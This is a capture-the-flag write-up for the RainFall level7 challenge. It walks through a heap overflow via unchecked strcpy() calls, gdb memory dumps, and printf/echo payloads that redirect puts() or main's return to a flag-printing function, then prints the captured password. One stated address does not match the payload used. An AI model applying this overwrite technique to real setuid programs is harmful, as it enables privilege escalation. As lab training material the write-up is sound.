@@ -1,0 +1,108 @@
+
+```bash
+level7@RainFall:~$ ls -la
+-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
+
+level7@RainFall:~$ file level7 
+level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
+```
+Reversed in c:
+```c
+char c[80];
+
+int m(void)
+{
+    time_t v0;
+
+    v0 = time(0);
+    return printf("%s - %d\n", c, v0);
+}
+
+int main(int argc, const char **argv, const char **envp)
+{
+    FILE *flag_fd;
+    char **args_1;
+    char **args_2;
+
+    args_1 = malloc(8u);;
+    args_1[0] = 1;          // *(DWORD *)args_1
+    args_1[1] = malloc(8u); // *((DWORD *)args_1 + 1)
+
+    args_2 = malloc(8u);
+    args_2[0] = 2;
+    args_2[1] = malloc(8u);
+
+    strcpy(args_1[1], argv[1]);
+    strcpy(args_2[1], argv[2]);
+
+    flag_fd = fopen("/home/user/level8/.pass", "r");
+    fgets(c, 68, flag_fd);
+    puts("~~");
+    return 0;
+}
+```
+
+Spot the vunerability : two `strcpy()` take user's input without length protection. 
+So we can overflow and take in control the heap to do operations: replace `puts()` with `m()`, which will print the flag.
+
+We gonna use `argv[1]` to inject the adress of the return value in the `args_2`'s pointer to data (`0x0804a038`).
+And write the adress of `m()` to the data it points to (0x42424242 below)
+
+The heap with args AAAA BBBB:
+(gdb) x/50x 0x804a000
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
+0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
+0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
+
+We write the payload and run it:
+```bash
+rm -f /tmp/payload_7_args1
+printf 'A%.0s' {1..20} > /tmp/payload_7_args1  
+echo -ne "\x28\x99\x04\x08" >> /tmp/payload_7_args1 
+rm -f /tmp/payload_7_args2
+echo -ne "\xf4\x84\x04\x08" > /tmp/payload_7_args2 
+echo -ne "$(</tmp/payload_7_args1) $(</tmp/payload_7_args2)" | xargs -l ./level7
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1759588378
+```
+
+## Another way - replace the main return value by m()
+
+First we need to find where is `m()`:
+```bash
+(gdb) info adress m
+Symbol "m" is at 0x80484f4 in a file compiled without debugging.
+```
+
+Then find the base of the stack:
+```bash
+(gdb) info register
+esp            0xbffff728       0xbffff728
+ebp            0xbffff728       0xbffff728
+esi            0x0      0
+edi            0x0      0
+eip            0x8048524        0x8048524 <main+3>
+(gdb) x/8x $ebp
+0xbffff728:     0x00000000      0xb7e454d3      0x00000003      0xbffff7c4
+0xbffff738:     0xbffff7d4      0xb7fdc858      0x00000000      0xbffff71c
+```
+
+Write the payload:
+```bash
+rm -f /tmp/payload_7_args1
+printf 'A%.0s' {1..20} > /tmp/payload_7_args1 # pading 0x804a018 -> 0x804a02c = 20
+echo -ne "\x2c\xf7\xff\xbf" >> /tmp/payload_7_args1 # inject the address of the return of `main()` (0xbffff72c)
+rm -f /tmp/payload_7_args2
+echo -ne "\xf4\x84\x04\x08" > /tmp/payload_7_args2 # the address of `m()` (0x80484f4)
+```
+
+And run it:
+```
+level7@RainFall:~$ echo -ne "$(</tmp/payload_7_args1) $(</tmp/payload_7_args2)" | xargs -l ./level7
+~~
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1759083486
+xargs: ./level7: terminated by signal 11
+```
